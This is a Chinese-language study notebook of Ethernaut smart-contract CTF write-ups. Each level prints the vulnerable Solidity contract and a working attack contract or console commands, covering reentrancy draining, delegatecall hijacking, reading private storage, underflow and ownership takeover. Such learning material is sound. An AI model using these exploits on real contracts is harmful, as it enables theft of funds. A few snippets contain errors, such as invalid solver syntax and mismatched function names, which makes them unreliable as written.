# BlockChain
[[language/solidity]]



## Audit Report
[zachobront audit reports](https://github.com/zobront/audits)

## Audit Challenge
### Capture The Ether

没找到怎么开启，RopSten测试网已经被弃用

### Ethernauts

>   *通过破解智能合约来闯关*

1.   **Hello Ethernaut**

     跟着提示输入调用几个contract函数即可

2.   **Fallback**

     ```solidity
     pragma solidity ^0.8.0;
     
     contract Fallback {
     
       mapping(address => uint) public contributions;
       address public owner;
     
       constructor() {
         owner = msg.sender;
         contributions[msg.sender] = 1000 * (1 ether);
       }
     
       modifier onlyOwner {
             require(
                 msg.sender == owner,
                 "caller is not the owner"
             );
             _;
         }
     
       function contribute() public payable {
         require(msg.value < 0.001 ether);
         contributions[msg.sender] += msg.value;
     //如果sender的贡献>owner,则修改owner
         if(contributions[msg.sender] > contributions[owner]) {
           owner = msg.sender;
         }
       }
     //获取调用者的贡献值
       function getContribution() public view returns (uint) {
         return contributions[msg.sender];
       }
     
       function withdraw() public onlyOwner {
         payable(owner).transfer(address(this).balance);
       }
     //这是一个 fallback函数,也可以称为接受ether的函数,当合约接收到ether却不存在处理的函数,就会调用fallback函数回退
       receive() external payable {
         require(msg.value > 0 && contributions[msg.sender] > 0);
         owner = msg.sender;
       }
     }
     ```

     *   you claim ownership of the contract

     *   you reduce its balance to 0

         ```solidity
         //constructor()初始化了1000个ether,而我们每次只能发送<0.001个,这需要大量请求才能成为owner
         
         //receive()
         payload:
         //首先我们的贡献>0才能调用receive()
         contract.contribute({value:1})
         //发送支付请求来调用receive()
         contract.sendTransaction({value:1})
         //成为owner后清空余额
         contract.withdraw()
         ```

3.   **Fallout**

     ```js
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.6.0;
     
     import 'openzeppelin-contracts-06/math/SafeMath.sol';
     
     contract Fallout {
       
       using SafeMath for uint256;
       mapping (address => uint) allocations;
       address payable public owner;
     
       function Fal1out() public payable {
         owner = msg.sender;
         allocations[owner] = msg.value;
       }
     
       modifier onlyOwner {
     	        require(
     	            msg.sender == owner,
     	            "caller is not the owner"
     	        );
     	        _;
     	    }
     
       function allocate() public payable {
         allocations[msg.sender] = allocations[msg.sender].add(msg.value);
       }
     
       function sendAllocation(address payable allocator) public {
         require(allocations[allocator] > 0);
         allocator.transfer(allocations[allocator]);
       }
     
       function collectAllocations() public onlyOwner {
         msg.sender.transfer(address(this).balance);
       }
     
       function allocatorBalance(address allocator) public view returns (uint) {
         return allocations[allocator];
       }
     }
     ```

     针对 `Fal1out`函数没有做鉴权,任何人都可以调用并执行

4.   **Coin Flip**

     ```solidity
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.8.0;
     
     contract CoinFlip {
     
       uint256 public consecutiveWins;
       uint256 lastHash;
       uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     
       constructor() {
         consecutiveWins = 0;
       }
     
       function flip(bool _guess) public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
     
         if (lastHash == blockValue) {
           revert();
         }
     
         lastHash = blockValue;
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
     
         if (side == _guess) {
           consecutiveWins++;
           return true;
         } else {
           consecutiveWins = 0;
           return false;
         }
       }
     }
     ```

     *   连胜十次即可

         使用攻击合约计算出结果后传给目标合约

       ```solidity
         interface CoinFlip{
         function flip(bool _guess) external returns (bool);
         }
         
         contract attack{
         	uint256 public consecut;
         	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         	address target=0x7C94823b2D84fcA9A125f967326ccBb800A7d1ec;
         	function coinfilp() public returns (bool){
         		uint256 blockvalue=uint256(blockhash(block.number -1));
         
         		uint256 coinFilp=blockvalue/FACTOR;
         		bool side=coinFilp==1?true:false;
         		CoinFlip c=CoinFlip(target);
         		c.flip(side);
         	}
         
         }
         ```
         
         

5.   **Telephone**

     ```solidity
     pragma solidity ^0.8.0;
     
     contract Telephone {
     
       address public owner;
     
       constructor() {
         owner = msg.sender;
       }
     
       function changeOwner(address _owner) public {
       //tx.origin 交易发起人  msg.sender 函数调用者
         if (tx.origin != msg.sender) {
           owner = _owner;
         }
       }
     }
     
     ```

     很明显让外部合约调用`changeOwner`函数即可

     ```solidity
     interface Telephone{
       function changeOwner(address _owner) external;
     }
     
     contract attack{
           function exploit() public{
           address owner=0xaF3a113e418906110bED4AF4852627ce6eb6E500;
           Telephone t=Telephone(owner);
           t.changeOwner(msg.sender);
       }
     }
     ```

6.   **Token**

     ```solidity
     pragma solidity ^0.6.0;
     
     contract Token {
     
       mapping(address => uint) balances;
       uint public totalSupply;
     
       constructor(uint _initialSupply) public {
         balances[msg.sender] = totalSupply = _initialSupply;
       }
     
       function transfer(address _to, uint _value) public returns (bool) {
         require(balances[msg.sender] - _value >= 0);
         balances[msg.sender] -= _value;
         balances[_to] += _value;
         return true;
       }
     
       function balanceOf(address _owner) public view returns (uint balance) {
         return balances[_owner];
       }
     }
     
     
     ```

     *   整数下溢 

         uint 是无符号整数，-1产生下溢会变为 2^256^-1

         ```
         contract.transfer(contarct.address,21);
         ```

7.   **Delegation**

     ```solidity
     pragma solidity ^0.8.0;
     
     contract Delegate {
     
       address public owner;
     
       constructor(address _owner) {
         owner = _owner;
       }
     
       function pwn() public {
         owner = msg.sender;
       }
     }
     
     contract Delegation {
     
       address public owner;
       Delegate delegate;
     
       constructor(address _delegateAddress) {
         delegate = Delegate(_delegateAddress);
         owner = msg.sender;
       }
     
       fallback() external {
         (bool result,) = address(delegate).delegatecall(msg.data);
         if (result) {
           this;
         }
       }
     }
     
     ```

     >   在以太坊智能合约中，delegatecall是一种特殊的函数调用方式。它允许一个合约调用另一个合约的函数，但是在执行过程中，被调用的函数的上下文（如msg.sender、msg.value、storage等）会被替换成调用者合约的上下文。

     所以只需要让 `delegatecall`调用 `pwn()`即可

     data前四个字节为函数选择器,由 `Keccak hash`得到

     ![image-20230409235821280](https://gitee.com/leiye87/typora_picture/raw/master/20230409235823.png)

     而后四个字节由参数决定,但是pwn为无参函数,所以取前八位

     ```js
     contract.sendTransaction({data:"0xDD365B8B"})
     ```

     sendTransaction->fallback->delegatecall->pwn

8.   **Force**

     ```solidity
     
     ```

     *   让合约里的余额>0

         但是合约为空,不存在 payable函数,但是存在一些方法强制让合约获取到我们的以太币,如`selfdestruct`

         >   `selfdestruct()`是一种销毁智能合约并将其以太币余额发送到给定地址的特殊方法。如果我们创建一个带有调用函数的合约，`selfdestruct()`并将`Force.sol`实例地址作为其接收者，向它发送一些 eth，然后调用 destruct 合约，您将向我们的目标合约发送以太币。

         ```solidity
         pragma solidity ^0.8.0;
         contract solve{
             uint public balance=0;
             function despoit() external payable{
                 balance+=msg.value;
             }
             function destruct(address payable _to) external payable{
                 selfdestruct(_to);
             }
         }
         ```

9.   **Vault**

     ```solidity
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.8.0;
     
     contract Vault {
       bool public locked;
       bytes32 private password;
     
       constructor(bytes32 _password) {
         locked = true;
         password = _password;
       }
     
       function unlock(bytes32 _password) public {
         if (password == _password) {
           locked = false;
         }
       }
     }
     ```

     *   Unlock the vault to pass the level!

         要求输入正确的密码才可以解锁,也就是说要获取到 `private`类型的值,又或者在 == 存在弱比较

         然而在区块链,所有的变量都是可以访问到的

         >   合约的状态变量以一种紧凑的方式存储在区块链存储中，以这样的方式，有时多个值会使用同一个存储槽。 除了动态大小的数组和 映射mapping （见下文），数据的存储方式是从位置 `0` 开始连续放置在 存储storage 中。 对于每个变量，根据其类型确定字节大小。
         >
         >   存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中

         所以我们要确定password存储在哪个插槽

         >   The state variable `password` is located in storage #1 (#0 is the state variable `locked`). Grab it from the challenge contract storage

         ```js
         //获取密码
         const password=web3.eth.getStorageAt(contract.address, 1)
         //发送
         contract.unlock(password)
         ```

10.   **King**

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      contract King {
      
        address king;
        uint public prize;
        address public owner;
      
        constructor() payable {
          owner = msg.sender;  
          king = msg.sender;
          prize = msg.value;
        }
      
        receive() external payable {
          require(msg.value >= prize || msg.sender == owner);
          payable(king).transfer(msg.value);
          king = msg.sender;
          prize = msg.value;
        }
      
        function _king() public view returns (address) {
          return king;
        }
      }
      ```

      *   成为king

          只需要我们发送的value>prize即可,但在提交实例时,关卡将收回king,需要合约的回退函数执行 revert

          ```solidity
          pragma solidity ^0.8.0;
          
          
          contract solve{
              constructor(address target) payable {
                  address(target).call{value:msg.value}("");
              }
              receive() payable external{
                  revert();
              }
          }
          ```

11.   **Re-entrancy**

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.6.12;
      
      import 'openzeppelin-contracts-06/math/SafeMath.sol';
      
      contract Reentrance {
        
        using SafeMath for uint256;
        mapping(address => uint) public balances;
      
        function donate(address _to) public payable {
          balances[_to] = balances[_to].add(msg.value);
        }
      
        function balanceOf(address _who) public view returns (uint balance) {
          return balances[_who];
        }
      
        function withdraw(uint _amount) public {
          if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
              _amount;
            }
            balances[msg.sender] -= _amount;
          }
        }
      
        receive() external payable {}
      }
      ```

      *   使账户余额为0

          注意到 `withdraw()`函数,在判断余额后,先发送余额而后减去 `_amount`,我们可以 利用我们的合约来进行重入攻击

          ```solidity
          // SPDX-License-Identifier: MIT
          pragma solidity ^0.8.0;
          
          interface IReentrance {
              function donate(address _to) external payable;
              function withdraw(uint _amount) external;
          }
          
          contract ReentranceAttack {
              address public owner;
              IReentrance targetContract;
              uint constant targetValue = 1000000000000000; // 0.001 ether
          
              constructor(address _target) {
                  targetContract = IReentrance(_target);
                  owner = msg.sender;
              }
          
              function getBalance() public view returns (uint) {
                  return address(this).balance;
              }
          
              function donateAndWithdraw() public payable {
                  require(msg.value >= targetValue);
                  targetContract.donate{value: msg.value}(address(this));
                  targetContract.withdraw(msg.value); // exploit reentrancy
              }
          
              function withdrawAll() public returns (bool) {
                  require(msg.sender == owner);
                  uint totalBalance = address(this).balance;
                  (bool sent, ) = msg.sender.call{value: totalBalance}("");
                  require(sent);
                  return sent;
              }
          
              receive() external payable {
                  uint targetBalance = address(targetContract).balance;
                  if (targetBalance >= targetValue) {
                    targetContract.withdraw(targetValue);
                  }
              }
              
          ```

          我们的receive函数在接收到对方合约的交易后会继续调用对方合约的withdraw一直到对方的targetvalue

12.   **Elevator**

      ```solidity
      
      
      Things that might help:
      Sometimes solidity is not good at keeping promises.
      This Elevator expects to be used from a Building.
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      interface Building {
        function isLastFloor(uint) external returns (bool);
      }
      
      
      contract Elevator {
        bool public top;
        uint public floor;
      
        function goTo(uint _floor) public {
          Building building = Building(msg.sender);
      
          if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
          }
        }
      }
      ```

      *   电梯爬楼梯，我们要让 top==true,注意到需要满足 第一次`building.isLastFloor(_floor)==true`&&第二次 `building.isLastFloor(floor)==false`，而这俩次的floor其实是同一个变量，只需实现一个合约，第一次调用为true，第二次为false即可

          ```solidity
          pragma solidity ^0.8.0;
          
          interface Elevator{
              function goTo(uint _floor) external;
          }
          contract solve {
              address targetAddress=0x4C66169fDFA793096783F58EcB2fDe1D845D3A3b;
              uint public count=0;
              function isLastFloor(uint _floor) external returns(bool){
                  count++;
                  if(count==1)
                  return false;
                  else
                  return true;
              }
              function attack() external payable{
                  Elevator(targetAddress).goTo(0);
                  
              }
          }
          ```

13.   **Privacy**

      ```solidity
      pragma solidity ^0.8.0;
      
      contract Privacy {
      
        bool public locked = true;
        uint256 public ID = block.timestamp;
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(block.timestamp);
        bytes32[3] private data;
      
        constructor(bytes32[3] memory _data) {
          data = _data;
        }
        
        function unlock(bytes16 _key) public {
          require(_key == bytes16(data[2]));
          locked = false;
        }
      
        /*
          A bunch of super advanced solidity algorithms...
      
            ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
            .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
            *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
            `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
            ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
        */
      }
      ```

      | storage layout                                         |
      | ------------------------------------------------------ |
      | bool locked                                            |
      | uint256 ID                                             |
      | uint8 flattening   uint8 denomation uint16 awkwardness |
      | bytes[0]                                               |
      | bytes[1]                                               |
      | bytes[2]                                               |

      要解锁首先获取bytes[2]的值再将其转换为bytes16

      >   在 Solidity 中，将 `bytes32` 类型转换为 `bytes16` 类型时，会取 `bytes32` 的前 16 个字节作为 `bytes16` 的值。由于 Solidity 中采用的是大端序（big-endian）字节序，即高位字节在前、低位字节在后，因此在这种转换中，会取 `bytes32` 的高位 16 个字节作为 `bytes16` 的值

      ```solidity
      await web3.eth.getStorageAt(contract.address, 5)
      0x
      dc77c687bb0f4faa11c787b1ef7ba598
      27391efac375685e160bf5235d59d2ca
      //转换为bytes16则取高16位
      0xdc77c687bb0f4faa11c787b1ef7ba598
      await contract.unlock('0xdc77c687bb0f4faa11c787b1ef7ba598')
      ```

      这和 `Valut` 也没区别啊

14.   **Gatekeeper One**

      ```solidity
      pragma solidity ^0.8.0;
      
      contract GatekeeperOne {
      
        address public entrant;
      
        modifier gateOne() {
          require(msg.sender != tx.origin);
          _;
        }
      
        modifier gateTwo() {
          require(gasleft() % 8191 == 0);
          _;
        }
      
        modifier gateThree(bytes8 _gateKey) {
            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
            require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
          _;
        }
      
        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
          entrant = tx.origin;
          return true;
        }
      }
      ```

      *   成为参赛者，有三关

          `gateOne` 通过外部合约可以绕过

          `gateTwo` 需要我们控制gas的值让它为8191的倍数，或者我们直接设置gas=0

          ```solidity
          // SPDX-License-Identifier: MIT
          pragma solidity ^0.8.0;
          
          interface IGatekeeperOne {
              function enter(bytes8 _gateKey) external returns(bool);
          }
          
          contract attack {
              event Failed(bytes reason, uint256 gas);
          
              function run() external {
                  IGatekeeperOne target = IGatekeeperOne(0x1A6742878b66bEA357790541894a38010831B05F);
          
                  // Some dummy _gateKey passed into enter()
                  bytes8 key;
                  key = 0xdeadbeefdeadbeef;
          
                  // Starts with 100000
                  uint256 gas = 100000;
                  // Brute-force 100000+0, 100000+1, ..., 100000+8190
                  for(uint256 i; i < 8191; ++i) {
                      gas += 1;
                      try target.enter{gas:gas}(key) {}
                      catch (bytes memory reason) {
                          emit Failed(reason, gas);
                      }
                  }
              }
          }
          ```

          *   gas `106739`

          `gateThree` 需要满足三个条件

          bytes8 为8个字节，`0x XXXX XXXX 0000 <地址后四位>`

          *   ```solidity
              // SPDX-License-Identifier: MIT
              pragma solidity ^0.8.0;
              
              interface IGatekeeperOne {
                  function enter(bytes8 _gateKey) external returns(bool);
              }
              
              contract attack {
                  event Failed(bytes reason, uint256 gas);
              
                  function run() external {
                      IGatekeeperOne target = IGatekeeperOne(0xA7733993520579fe705739d139b51ca57bCcCb0d);
              
                      bytes8 key;
                      key = 0xdeadbeef0000ddC4;
              
                      uint256 gas = 24445;
                      target.enter{gas:gas}(key);
                  }
              }
              
          

15.   **Gatekeeper Two**

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      contract GatekeeperTwo {
      
        address public entrant;
      
        modifier gateOne() {
          require(msg.sender != tx.origin);
          _;
        }
      
        modifier gateTwo() {
          uint x;
          assembly { x := extcodesize(caller()) }
          require(x == 0);
          _;
        }
      
        modifier gateThree(bytes8 _gateKey) {
          require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
          _;
        }
      
        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
          entrant = tx.origin;
          return true;
        }
      }
      ```

      `gateone`依旧是外部合约绕过

      `gatetwo`  采用了内联汇编   (EOA check)

      >   `extcodesize`是Solidity中的一种内联汇编指令，用于返回指定地址所关联的合约代码的大小。在这里，`caller()`函数返回当前调用合约的地址

      也就是我们要让代码大小==0，即检查我们的账户是不是外部拥有账户(EOA),也就不能是智能合约账户(SCA)

      >   The idea is that extcodesize() returns 0 during the construction phase. If we put all the code in constructor, then this check will be bypassed.

      `gatethree`

      ```
      x ^ y = z` then `y = x ^ z
      ```

      calc

      ```
      uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
      ```

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      interface IGatekeeperTwo {
          function enter(bytes8 _gateKey) external returns(bool);
      }
      
      contract attack {
      
          constructor() {
              IGatekeeperTwo target = IGatekeeperTwo(0x8c080F851d6aa4A885fDcfAAC3e13d55FA4BbBa1);
      
              bytes8 key;
              key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
      
              target.enter(key);
          }
      }
      ```

16.   **Naught Coin**

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
      
      //is 是继承
       contract NaughtCoin is ERC20 {
      
        // string public constant name = 'NaughtCoin';
        // string public constant symbol = '0x0';
        // uint public constant decimals = 18;
        uint public timeLock = block.timestamp + 10 * 365 days;
        uint256 public INITIAL_SUPPLY;
        address public player;
      
        constructor(address _player) 
        ERC20('NaughtCoin', '0x0') {
          player = _player;
          INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
          // _totalSupply = INITIAL_SUPPLY;
          // _balances[player] = INITIAL_SUPPLY;
          _mint(player, INITIAL_SUPPLY);
          emit Transfer(address(0), player, INITIAL_SUPPLY);
        }
        
        function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
          super.transfer(_to, _value);
        }
      
        // Prevent the initial owner from transferring tokens until the timelock has passed
        modifier lockTokens() {
          if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
          } else {
           _;
          }
        } 
      } 
      ```

      >   ERC20是以太坊上最常用的代币标准之一，它定义了一个标准的接口，规定了代币合约应该实现的函数，包括以下函数及其功能：
      >
      >   1.  totalSupply()：获取代币的总发行量。
      >   2.  balanceOf(address _owner)：获取指定地址_owner的代币余额。
      >   3.  allowance(address _owner, address _spender)：查询_owner授权给_spender可以花费的代币数量。
      >   4.  transfer(address _to, uint256 _value)：将自己的代币转移到指定地址_to，并返回是否成功。
      >   5.  approve(address _spender, uint256 _value)：授权_spender可以花费_value个代币。
      >   6.  transferFrom(address _from, address _to, uint256 _value)：从_from账户中转移_value个代币到_to账户，并减少授权_spender能够花费的代币数量。
      >   7.  name()：获取代币的名称。
      >   8.  symbol()：获取代币的符号。
      >   9.  decimals()：获取代币的小数位数。
      >
      >   其中，1-6个函数是ERC20标准的必须实现函数，用于代币的转移、授权和查询，其余三个函数是可选的，用于代币的描述和信息展示。

      使用 `approve`为我们授权最大代币数量

      使用 `transferFrom`转出代币,也即是`transfer`只是一个幌子

      ```js
      //查看允许数量
      (await contract.allowance(player, "0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F")).toString()
      //设置最大代币数量
      await contract.approve("0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F", (await contract.balanceOf(player)).toString())
      //花
      await contract.transferFrom(player, '0x0000000000000000000000000000000000000000', (await contract.balanceOf(player))) 
      // 转到0地址会报错，换成题目的合约地址
      ```

17.   ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      contract Preservation {
      
        // public library contracts 
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner; 
        uint storedTime;
        // Sets the function signature for delegatecall
        bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
      
        constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
          timeZone1Library = _timeZone1LibraryAddress; 
          timeZone2Library = _timeZone2LibraryAddress; 
          owner = msg.sender;
        }
       
        // set the time for timezone 1
        function setFirstTime(uint _timeStamp) public {
          timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        }
      
        // set the time for timezone 2
        function setSecondTime(uint _timeStamp) public {
          timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        }
      }
      
      // Simple library contract to set the time
      contract LibraryContract {
      
        // stores a timestamp 
        uint storedTime;  
      
        function setTime(uint _time) public {
          storedTime = _time;
        }
      }
      
      ```

      分为两个时区库,

      ```
      // 分时区调用 LibraryContract的setTime 调用后会修改
      timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));

      新建恶意合约

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      contract PreservationHack {
      
          address public timeZone1Library; // slot 0
          address public timeZone2Library; // slot 1
          address public owner; // slot 2
          uint storedTime; // slot 3
      
          function setTime(uint256 _time) public {
              owner = msg.sender;
          }
      }
      ```

      ```
      //调用后更新 timeZone1Library为恶意合约地址
      await contract.setFirstTime('<malicious_contract_address>')
      // 再次调用时setTime更新为恶意地址,调用后成功修改owner
      await contract.setFirstTime(1337)
      ```

18.   Recovery

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      contract Recovery {
      
        //generate tokens
        function generateToken(string memory _name, uint256 _initialSupply) public {
          new SimpleToken(_name, msg.sender, _initialSupply);
        
        }
      }
      
      contract SimpleToken {
      
        string public name;
        mapping (address => uint) public balances;
      
        // constructor
        constructor(string memory _name, address _creator, uint256 _initialSupply) {
          name = _name;
          balances[_creator] = _initialSupply;
        }
      
        // collect ether in return for tokens
        receive() external payable {
          balances[msg.sender] = msg.value * 10;
        }
      
        // allow transfers of tokens
        function transfer(address _to, uint _amount) public { 
          require(balances[msg.sender] >= _amount);
          balances[msg.sender] = balances[msg.sender] - _amount;
          balances[_to] = _amount;
        }
      
        // clean up after ourselves
        function destroy(address payable _to) public {
          selfdestruct(_to);
        }
      }
      ```

      首先我们需要计算 SimpleToken的合约地址,然后调用它的destroy方法,将eth支付给我们

      计算地址

      >   ```solidity
      >   address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
      >   ```
      >
      >   ```solidity
      >   address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x41D8b9C48319614aB97BF7d9dF1e052835bc21C6), bytes1(0x01))))))
      >   ```

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      contract test{
          address  public result=address(
              uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x39FD056EaE67385c9344505Ca0e360b369061c69), bytes1(0x01)))))
              );
          }
      ```

      ```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.0;
      
      import './SimpleToken.sol';
      
      contract RecoveryHack {
          address payable lostAddress = payable(address(0x3775e84A208fbef8B7F220F2565f719cC513aEdb));
          SimpleToken simpleToken = SimpleToken(lostAddress);
      
          function pwn() external payable {
              simpleToken.destroy(payable(<your_Metamask_wallet_address>));
          }
      }
      ```


19. MagicNumber

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

这道题目让我们创建一个合约,调用 `whatIsTheMeaningOfLife()` 时返回42

```js
contract solver{
function whatIsTheMeaningOfLife external returns(uint)(){
return 42;
	}
}
```

看起来,很简单,但是还有一个要求是10个操作数,也就是10个字节 
转换成opcode
*runtime code*
```js
// storing into memory
push1 0x2a
push1 0x00
MSTORE //存储 42 偏移为0的 到内存中
// returning

push1 0x20
push 0x00
return //从memory中返回长度为32字节,偏移量为0

```

https://www.evm.codes/playground 转换为 `602a60005260206000f3`

*creation code*
```js
PUSH10 0x602a60005260206000f3
PUSH1 0x00
MSTORE


PUSH1 0x0a
PUSH1 0x16 //22   32-10
RETURN
```

`69602a60005260206000f3600052600a6016f3`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNumberHack {
    constructor(MagicNum challenge) {
        // len(bytecode) = 19 = 0x13
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        
        address addr;
        assembly {
            // create(value, offset, size)
            addr := create(0, add(bytecode, 0x20), 0x13)
        }
        
        // Verify if the contract was successfully deployed
        require(addr != address(0));

        // Interact with the challenge contract
        challenge.setSolver(addr);
    }
}

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}

```

> Pay attention to the create() function call: the second parameter is add(bytecode, 0x20), not bytecode. Here bytecode is a pointer to the memory location and we are getting the location 32 bytes after that pointer. But Why? It is because the datatype bytes is made of two parts. The first 32 bytes of it is the length of the byte string, and the actual value of the byte string comes after that 32 bytes. The datatype string works the same.

![[Hello world ABI encoding example.png]]

20. Alien Codex

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

![[Pasted image 20230507214436.png]]

调用 `retract`函数 后溢出
![[Pasted image 20230507230421.png]]

slot1里的值为 `codex.length`,溢出变为2^256-1
在继承的情况下,slot的顺序是按照继承的顺序排列


```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function make_contact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract AlienCodexHack {
    constructor(IAlienCodex challenge) {
        // contact = true;
        challenge.make_contact();

        // codex.length = 2**256 - 1;
        challenge.retract();

        // Overwrite codex[i] <=> slot 0
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i = 0 - h;
        }
        challenge.revise(i, bytes32(uint256(uint160(msg.sender))));

        // Verify if we are the owner now
        require(challenge.owner() == msg.sender, "Failed.");
    }
}
```
不知道为什么修改长度为2\*\*256-1后就可以视作动态数组然后覆盖slot0 
